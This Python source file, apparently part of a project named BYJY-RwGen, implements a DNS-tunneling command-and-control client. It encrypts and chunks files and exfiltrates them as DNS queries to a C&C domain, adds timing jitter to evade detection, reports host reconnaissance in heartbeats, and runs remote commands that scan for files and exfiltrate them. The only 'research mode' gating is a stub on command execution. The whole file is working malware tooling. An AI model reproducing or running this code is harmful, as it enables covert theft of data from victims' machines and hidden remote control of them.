#!/usr/bin/env python3
"""
Advanced Bidirectional DNS Tunneling System - BYJY-RwGen
High-throughput covert communication channel with advanced features
"""

import dns.resolver
import dns.message
import dns.query
import dns.rdatatype
import dns.name
import base64
import json
import time
import random
import string
import threading
import queue
import hashlib
import hmac
import struct
import zlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import socket
import binascii
import sqlite3
import os
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
import asyncio
import aiofiles

@dataclass
class DNSPacket:
    """DNS packet structure for tunneling"""
    session_id: str
    sequence: int
    packet_type: str
    chunk_index: int
    total_chunks: int
    data: bytes
    checksum: str
    timestamp: int

class DNSProtocolHandler:
    """Advanced DNS protocol handler with multiple encoding schemes"""
    
    ENCODING_SCHEMES = {
        'base32': {'alphabet': string.ascii_lowercase + '234567', 'padding': True},
        'base36': {'alphabet': string.ascii_lowercase + string.digits, 'padding': False},
        'hex': {'alphabet': string.hexdigits.lower(), 'padding': False}
    }
    
    def __init__(self, scheme='base32'):
        self.scheme = scheme
        self.config = self.ENCODING_SCHEMES[scheme]
        
    def encode_dns_safe(self, data: bytes) -> str:
        """Encode data using DNS-safe characters"""
        if self.scheme == 'base32':
            encoded = base64.b32encode(data).decode().lower()
            return encoded.rstrip('=') if not self.config['padding'] else encoded
        
        elif self.scheme == 'base36':
            # Custom base36 encoding
            num = int.from_bytes(data, 'big')
            if num == 0:
                return '0'
            
            result = ''
            alphabet = self.config['alphabet']
            while num:
                num, remainder = divmod(num, 36)
                result = alphabet[remainder] + result
            return result
        
        elif self.scheme == 'hex':
            return data.hex()
        
        return base64.b32encode(data).decode().lower().rstrip('=')
    
    def decode_dns_safe(self, encoded: str) -> bytes:
        """Decode DNS-safe encoded data"""
        try:
            if self.scheme == 'base32':
                # Add padding if needed
                padding = (8 - len(encoded) % 8) % 8
                encoded += '=' * padding
                return base64.b32decode(encoded.upper())
            
            elif self.scheme == 'base36':
                alphabet = self.config['alphabet']
                num = 0
                for char in encoded:
                    num = num * 36 + alphabet.index(char)
                
                # Convert back to bytes
                byte_length = (num.bit_length() + 7) // 8
                return num.to_bytes(max(1, byte_length), 'big')
            
            elif self.scheme == 'hex':
                return bytes.fromhex(encoded)
                
            # Fallback to base32
            padding = (8 - len(encoded) % 8) % 8
            encoded += '=' * padding
            return base64.b32decode(encoded.upper())
            
        except Exception as e:
            print(f"Decode error ({self.scheme}): {e}")
            return b''

class AdvancedDNSTunnel:
    """Advanced DNS tunneling with bidirectional communication and flow control"""
    
    def __init__(self, domain: str, encryption_key: str = None, 
                 dns_servers: List[str] = None, max_chunk_size: int = 32):
        self.domain = domain
        self.dns_servers = dns_servers or ['1.1.1.1', '8.8.8.8', '208.67.222.222', '9.9.9.9']
        self.max_chunk_size = max_chunk_size
        
        # Session management
        self.session_id = self.generate_session_id()
        self.sequence_counter = 0
        self.sequence_lock = threading.Lock()
        
        # Protocol handler
        self.protocol = DNSProtocolHandler('base32')
        
        # Encryption
        self.cipher = self.init_encryption(encryption_key) if encryption_key else None
        
        # Flow control
        self.send_window = 10  # Number of packets in flight
        self.ack_timeout = 30  # Seconds
        self.pending_acks = {}  # sequence -> (timestamp, retry_count)
        
        # Queues for async communication
        self.outbound_queue = queue.Queue()
        self.inbound_queue = queue.Queue()
        self.command_queue = queue.Queue()
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_uploaded': 0,
            'bytes_downloaded': 0,
            'retransmissions': 0,
            'round_trip_times': []
        }
        
        # State management
        self.running = False
        self.threads = []
        
    def init_encryption(self, password: str) -> Fernet:
        """Initialize Fernet encryption with PBKDF2"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'byjy_advanced_dns_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return Fernet(key)
    
    def generate_session_id(self) -> str:
        """Generate cryptographically secure session ID"""
        return hashlib.sha256(
            f"{time.time()}_{random.random()}_{os.urandom(16).hex()}".encode()
        ).hexdigest()[:8]
    
    def get_next_sequence(self) -> int:
        """Get next sequence number thread-safely"""
        with self.sequence_lock:
            seq = self.sequence_counter
            self.sequence_counter = (self.sequence_counter + 1) % 0xFFFF
            return seq
    
    def create_packet(self, packet_type: str, data: bytes = b'', 
                     chunk_index: int = 0, total_chunks: int = 1) -> DNSPacket:
        """Create DNS tunnel packet"""
        # Compress data
        if len(data) > 100:
            data = zlib.compress(data)
        
        # Encrypt data
        if self.cipher and data:
            data = self.cipher.encrypt(data)
        
        # Create packet
        packet = DNSPacket(
            session_id=self.session_id,
            sequence=self.get_next_sequence(),
            packet_type=packet_type,
            chunk_index=chunk_index,
            total_chunks=total_chunks,
            data=data,
            checksum='',
            timestamp=int(time.time())
        )
        
        # Calculate checksum
        packet.checksum = self.calculate_checksum(packet)
        
        return packet
    
    def calculate_checksum(self, packet: DNSPacket) -> str:
        """Calculate packet checksum for integrity verification"""
        packet_data = f"{packet.session_id}{packet.sequence}{packet.packet_type}"
        packet_data += f"{packet.chunk_index}{packet.total_chunks}{packet.timestamp}"
        packet_data += packet.data.hex() if packet.data else ''
        
        return hashlib.md5(packet_data.encode()).hexdigest()[:8]
    
    def verify_packet(self, packet: DNSPacket) -> bool:
        """Verify packet integrity"""
        expected_checksum = self.calculate_checksum(packet)
        return packet.checksum == expected_checksum
    
    def serialize_packet(self, packet: DNSPacket) -> str:
        """Serialize packet to DNS query format"""
        # Encode packet components
        components = [
            packet.session_id[:8],
            f"{packet.sequence:04x}",
            packet.packet_type[:4],
            f"{packet.chunk_index:03x}",
            f"{packet.total_chunks:03x}",
            f"{packet.timestamp:08x}",
            packet.checksum[:8]
        ]
        
        # Add data if present
        if packet.data:
            encoded_data = self.protocol.encode_dns_safe(packet.data)
            # Split into DNS label-sized chunks
            data_chunks = []
            for i in range(0, len(encoded_data), 60):  # DNS label max ~63 chars
                data_chunks.append(encoded_data[i:i+60])
            components.extend(data_chunks)
        
        # Build final query domain
        query_domain = '.'.join(components) + '.' + self.domain
        
        return query_domain
    
    def deserialize_packet(self, query_domain: str) -> Optional[DNSPacket]:
        """Deserialize packet from DNS query"""
        try:
            # Remove domain suffix
            if not query_domain.endswith('.' + self.domain):
                return None
            
            query_part = query_domain[:-len(self.domain)-1]
            components = query_part.split('.')
            
            if len(components) < 7:
                return None
            
            # Parse components
            session_id = components[0]
            sequence = int(components[1], 16)
            packet_type = components[2]
            chunk_index = int(components[3], 16)
            total_chunks = int(components[4], 16)
            timestamp = int(components[5], 16)
            checksum = components[6]
            
            # Reconstruct data
            data = b''
            if len(components) > 7:
                encoded_data = ''.join(components[7:])
                data = self.protocol.decode_dns_safe(encoded_data)
            
            # Create packet
            packet = DNSPacket(
                session_id=session_id,
                sequence=sequence,
                packet_type=packet_type,
                chunk_index=chunk_index,
                total_chunks=total_chunks,
                data=data,
                checksum=checksum,
                timestamp=timestamp
            )
            
            return packet
            
        except Exception as e:
            print(f"Packet deserialization error: {e}")
            return None
    
    def send_dns_query(self, query_domain: str, query_type: str = 'TXT') -> Optional[List[str]]:
        """Send DNS query with enhanced reliability"""
        for dns_server in random.sample(self.dns_servers, len(self.dns_servers)):
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [dns_server]
                resolver.timeout = 15
                resolver.lifetime = 45
                
                # Add jitter to avoid detection
                time.sleep(random.uniform(0.1, 0.3))
                
                start_time = time.time()
                response = resolver.resolve(query_domain, query_type)
                rtt = time.time() - start_time
                
                self.stats['round_trip_times'].append(rtt)
                self.stats['packets_sent'] += 1
                
                # Extract response data
                response_data = []
                for rdata in response:
                    if query_type == 'TXT':
                        txt_data = str(rdata).strip('"')
                        response_data.append(txt_data)
                    elif query_type == 'A':
                        # Could encode data in IP addresses
                        ip_data = str(rdata)
                        response_data.append(ip_data)
                
                return response_data
                
            except Exception as e:
                print(f"DNS query failed (server: {dns_server}): {e}")
                continue
        
        return None
    
    def send_packet_reliable(self, packet: DNSPacket) -> bool:
        """Send packet with reliability and acknowledgment"""
        query_domain = self.serialize_packet(packet)
        
        # Track for acknowledgment
        self.pending_acks[packet.sequence] = (time.time(), 0)
        
        # Send query
        response = self.send_dns_query(query_domain)
        
        if response:
            # Check for ACK in response
            for resp_data in response:
                if self.parse_ack(resp_data, packet.sequence):
                    if packet.sequence in self.pending_acks:
                        del self.pending_acks[packet.sequence]
                    return True
        
        return False
    
    def parse_ack(self, response_data: str, expected_seq: int) -> bool:
        """Parse acknowledgment from DNS response"""
        try:
            # Look for ACK pattern in response
            if 'ack' in response_data.lower():
                # Extract sequence number from ACK
                parts = response_data.split('_')
                for part in parts:
                    try:
                        seq = int(part, 16)
                        if seq == expected_seq:
                            return True
                    except ValueError:
                        continue
        except Exception:
            pass
        
        return False
    
    def send_data_chunked(self, data: bytes, packet_type: str = 'data') -> bool:
        """Send large data by chunking"""
        # Calculate chunk size accounting for protocol overhead
        effective_chunk_size = self.max_chunk_size - 50  # Protocol overhead
        
        chunks = []
        for i in range(0, len(data), effective_chunk_size):
            chunks.append(data[i:i + effective_chunk_size])
        
        total_chunks = len(chunks)
        success_count = 0
        
        for i, chunk in enumerate(chunks):
            packet = self.create_packet(packet_type, chunk, i, total_chunks)
            
            # Retry logic
            max_retries = 3
            for retry in range(max_retries):
                if self.send_packet_reliable(packet):
                    success_count += 1
                    break
                else:
                    self.stats['retransmissions'] += 1
                    time.sleep(random.uniform(1, 3))  # Exponential backoff
            
            # Flow control - wait for window
            if (i + 1) % self.send_window == 0:
                time.sleep(random.uniform(0.5, 1.5))
        
        self.stats['bytes_uploaded'] += len(data)
        
        return success_count == total_chunks
    
    def exfiltrate_file_advanced(self, file_path: str, priority: str = 'normal') -> bool:
        """Advanced file exfiltration with metadata and compression"""
        try:
            # Read file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Create file metadata
            file_info = {
                'path': file_path,
                'name': os.path.basename(file_path),
                'size': len(file_data),
                'modified': os.path.getmtime(file_path),
                'priority': priority,
                'checksum': hashlib.sha256(file_data).hexdigest(),
                'session': self.session_id
            }
            
            # Send metadata first
            metadata_json = json.dumps(file_info, separators=(',', ':'))
            if not self.send_data_chunked(metadata_json.encode(), 'meta'):
                print(f"Failed to send metadata for {file_path}")
                return False
            
            # Compress file data
            compressed_data = zlib.compress(file_data, level=9)
            compression_ratio = len(compressed_data) / len(file_data)
            
            print(f"[+] Exfiltrating {file_path} ({len(file_data)} bytes, "
                  f"compressed to {len(compressed_data)} bytes, "
                  f"ratio: {compression_ratio:.2f})")
            
            # Send compressed file data
            success = self.send_data_chunked(compressed_data, 'file')
            
            if success:
                # Send completion marker
                completion_info = {
                    'file': file_info['name'],
                    'status': 'complete',
                    'chunks_sent': (len(compressed_data) + self.max_chunk_size - 1) // self.max_chunk_size
                }
                self.send_data_chunked(json.dumps(completion_info).encode(), 'done')
                
                print(f"[+] Successfully exfiltrated {file_path}")
                return True
            else:
                print(f"[-] Failed to exfiltrate {file_path}")
                return False
                
        except Exception as e:
            print(f"File exfiltration error: {e}")
            return False
    
    def receive_commands(self) -> Optional[dict]:
        """Receive and parse commands from C&C"""
        # Send command request
        cmd_request = self.create_packet('cmd_req')
        response = self.send_dns_query(self.serialize_packet(cmd_request))
        
        if response:
            for resp_data in response:
                try:
                    # Decode command data
                    if resp_data.startswith('cmd_'):
                        encoded_cmd = resp_data[4:]  # Remove 'cmd_' prefix
                        cmd_data = self.protocol.decode_dns_safe(encoded_cmd)
                        
                        if self.cipher:
                            cmd_data = self.cipher.decrypt(cmd_data)
                        
                        # Decompress if needed
                        try:
                            cmd_data = zlib.decompress(cmd_data)
                        except zlib.error:
                            pass  # Not compressed
                        
                        command = json.loads(cmd_data.decode())
                        return command
                        
                except Exception as e:
                    print(f"Command parsing error: {e}")
        
        return None
    
    def start_c2_communication(self, poll_interval: int = 300):
        """Start continuous C&C communication"""
        self.running = True
        
        # Start background threads
        ack_thread = threading.Thread(target=self._ack_monitor, daemon=True)
        ack_thread.start()
        self.threads.append(ack_thread)
        
        print(f"[+] Starting advanced DNS C&C (session: {self.session_id})")
        
        while self.running:
            try:
                # Send heartbeat with enhanced system info
                heartbeat_info = {
                    'session': self.session_id,
                    'timestamp': int(time.time()),
                    'stats': self.stats,
                    'system': self._get_system_info(),
                    'capabilities': ['file_exfil', 'command_exec', 'persistence']
                }
                
                self.send_data_chunked(json.dumps(heartbeat_info).encode(), 'hb')
                
                # Check for commands
                command = self.receive_commands()
                if command:
                    self._process_command(command)
                
                # Adaptive polling interval based on activity
                activity_multiplier = 1.0
                if len(self.pending_acks) > 0:
                    activity_multiplier = 0.5  # More frequent polling if pending acks
                
                sleep_time = poll_interval * activity_multiplier * random.uniform(0.8, 1.2)
                time.sleep(min(sleep_time, 600))  # Max 10 minutes
                
            except KeyboardInterrupt:
                print("\n[+] Stopping DNS C&C communication")
                break
            except Exception as e:
                print(f"C&C communication error: {e}")
                time.sleep(60)
        
        self.stop()
    
    def _ack_monitor(self):
        """Background thread to monitor acknowledgments and retransmit"""
        while self.running:
            current_time = time.time()
            expired_acks = []
            
            for seq, (timestamp, retry_count) in self.pending_acks.items():
                if current_time - timestamp > self.ack_timeout:
                    if retry_count < 3:
                        # Retransmit
                        print(f"[!] Retransmitting packet {seq} (attempt {retry_count + 1})")
                        self.pending_acks[seq] = (current_time, retry_count + 1)
                        self.stats['retransmissions'] += 1
                    else:
                        # Give up
                        expired_acks.append(seq)
            
            # Clean up expired acknowledgments
            for seq in expired_acks:
                del self.pending_acks[seq]
            
            time.sleep(5)  # Check every 5 seconds
    
    def _get_system_info(self) -> dict:
        """Get enhanced system information"""
        import platform
        import psutil
        
        try:
            return {
                'hostname': platform.node(),
                'os': f"{platform.system()} {platform.release()}",
                'arch': platform.machine(),
                'python': platform.python_version(),
                'cpu_count': psutil.cpu_count(),
                'memory': psutil.virtual_memory().total,
                'disk_usage': psutil.disk_usage('/').percent,
                'network_interfaces': len(psutil.net_if_addrs()),
                'uptime': int(time.time() - psutil.boot_time())
            }
        except Exception:
            return {'error': 'Unable to gather system info'}
    
    def _process_command(self, command: dict):
        """Process advanced commands from C&C"""
        cmd_type = command.get('type')
        cmd_id = command.get('id', 'unknown')
        
        print(f"[+] Processing command {cmd_id}: {cmd_type}")
        
        result = {'cmd_id': cmd_id, 'status': 'success', 'output': ''}
        
        try:
            if cmd_type == 'exfil_files':
                # Exfiltrate multiple files
                file_list = command.get('files', [])
                priority = command.get('priority', 'normal')
                
                for file_path in file_list:
                    if os.path.exists(file_path):
                        self.exfiltrate_file_advanced(file_path, priority)
                    else:
                        result['output'] += f"File not found: {file_path}\n"
            
            elif cmd_type == 'exec':
                # Execute command (research mode only)
                if command.get('research_mode'):
                    cmd = command.get('command', '')
                    result['output'] = f"Research mode: would execute '{cmd}'"
                else:
                    result['status'] = 'blocked'
                    result['output'] = 'Command execution blocked in research mode'
            
            elif cmd_type == 'scan_files':
                # Scan for files matching pattern
                import glob
                pattern = command.get('pattern', '*.txt')
                max_files = command.get('max_files', 100)
                
                files = []
                for root in command.get('roots', ['.']):
                    matches = glob.glob(os.path.join(root, '**', pattern), recursive=True)
                    files.extend(matches[:max_files])
                
                result['output'] = json.dumps(files[:max_files])
            
            elif cmd_type == 'update_config':
                # Update tunnel configuration
                new_config = command.get('config', {})
                if 'poll_interval' in new_config:
                    self.poll_interval = new_config['poll_interval']
                if 'chunk_size' in new_config:
                    self.max_chunk_size = new_config['chunk_size']
                
                result['output'] = 'Configuration updated'
            
            else:
                result['status'] = 'unknown_command'
                result['output'] = f'Unknown command type: {cmd_type}'
        
        except Exception as e:
            result['status'] = 'error'
            result['output'] = str(e)
        
        # Send command result back
        self.send_data_chunked(json.dumps(result).encode(), 'result')
    
    def stop(self):
        """Stop DNS tunnel communication"""
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=5)
        
        print(f"[+] DNS tunnel stopped. Session stats: {self.stats}")

# Usage example
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced DNS Tunnel Client')
    parser.add_argument('--domain', required=True, help='C&C domain for DNS tunneling')
    parser.add_argument('--key', help='Encryption key')
    parser.add_argument('--dns-servers', nargs='+', 
                       default=['1.1.1.1', '8.8.8.8', '208.67.222.222'],
                       help='DNS servers to use')
    parser.add_argument('--file', help='File to exfiltrate')
    parser.add_argument('--poll-interval', type=int, default=300, 
                       help='C&C polling interval in seconds')
    parser.add_argument('--chunk-size', type=int, default=32,
                       help='Maximum chunk size for DNS queries')
    
    args = parser.parse_args()
    
    # Initialize tunnel
    tunnel = AdvancedDNSTunnel(
        domain=args.domain,
        encryption_key=args.key,
        dns_servers=args.dns_servers,
        max_chunk_size=args.chunk_size
    )
    
    if args.file:
        # Single file exfiltration
        print(f"[+] Exfiltrating file: {args.file}")
        success = tunnel.exfiltrate_file_advanced(args.file)
        print(f"[+] Exfiltration {'successful' if success else 'failed'}")
    else:
        # Start C&C communication loop
        try:
            tunnel.start_c2_communication(args.poll_interval)
        except KeyboardInterrupt:
            tunnel.stop()

if __name__ == "__main__":
    main()